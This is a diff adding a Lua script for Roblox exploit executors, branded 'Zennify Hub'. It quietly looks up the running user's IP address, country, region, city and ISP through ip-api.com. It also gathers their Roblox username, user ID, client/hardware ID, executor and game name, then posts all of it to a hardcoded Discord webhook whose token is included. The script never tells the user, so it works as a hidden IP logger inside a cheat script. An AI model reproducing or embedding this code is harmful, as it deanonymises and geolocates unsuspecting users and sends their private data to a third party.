@@ -1,0 +1,110 @@
+local Http = game:GetService("HttpService")
+local Web = "https://discord.com/api/webhooks/1287476350168465491/8NzT2snNcyzuffN7ohKazgVy6Z1ZtG7G2AbvD_kYajMkDUku18L4hBqJTO25vT7BeSPa"
+local userInputService = game:GetService("UserInputService")
+local device = "Unknown"
+local executor = identifyexecutor() or "Unknown"
+local jobid = game.JobId
+local boxsize = 0
+local isTouchEnabled = userInputService.TouchEnabled -- Returns true or false.
+if isTouchEnabled then
+    device = "Mobile"
+else
+    device = "PC"
+end
+local success, gameInfo = pcall(function()
+    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+end)
+local GAMENAME = success and gameInfo.Name or "Nome do jogo não disponível"
+
+-- Obtém informações de IP com segurança
+local success, IpInfo = pcall(function()
+    return Http:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+end)
+IpInfo = success and IpInfo or {}
+
+local IpFields = {
+    {"query", "IP:"}, -- IP address
+    {"country", "País:"}, -- Country
+    {"regionName", "Região:"}, -- Region
+    {"city", "Cidade:"}, -- City
+    {"isp", "Provedor de Serviços:"}, -- ISP
+    {"as", "Autonomia:"}, -- Autonomous system
+}
+
+local IpInfoString = ""
+for _, field in ipairs(IpFields) do
+    local apiField, displayName = field[1], field[2]
+    if IpInfo[apiField] then
+        IpInfoString = IpInfoString .. "**" .. displayName .. "** ||" .. IpInfo[apiField] .. "||\n"
+    end
+end
+
+local function sendRequest()
+    local jobid = game.JobId
+    local executor = identifyexecutor() or "Unknown"
+    local player = game.Players.LocalPlayer
+    local playerName = player and player.Name or "Nome do jogador não disponível"
+    local playerId = player and player.UserId or 0
+    local clientId = ""
+    local success, clientIdResult = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    clientId = success and clientIdResult or "ID do cliente não disponível"
+
+    return {
+        Url = Web,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = Http:JSONEncode({
+            ["avatar_url"] = "",
+            ["content"] = "",
+            ["embeds"] = {{
+                ["author"] = {
+                    ["name"] = "Zennify Hub",
+                },
+                ["title"] = "Sucess To Execute Script!!!",
+                ["description"] = playerName .. " | Nickname of Player",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xFFFFFF), -- Verde claro
+                ["thumbnail"] = {
+                    ["url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                },
+                ["fields"] = {
+                    {
+                        ["name"] = "Game Name:",
+                        ["value"] = "||" .. GAMENAME .. "||\n",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Hardware ID:",
+                        ["value"] = "||" .. clientId .. "||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = "||" .. executor .. "||",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "",
+                        ["value"] = "",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Informações",
+                        ["value"] = IpInfoString,
+                        ["inline"] = true
+                    }
+                }
+            }}
+        })
+    }
+end
+
+if syn then
+    syn.request(sendRequest())
+else
+    request(sendRequest())
+end
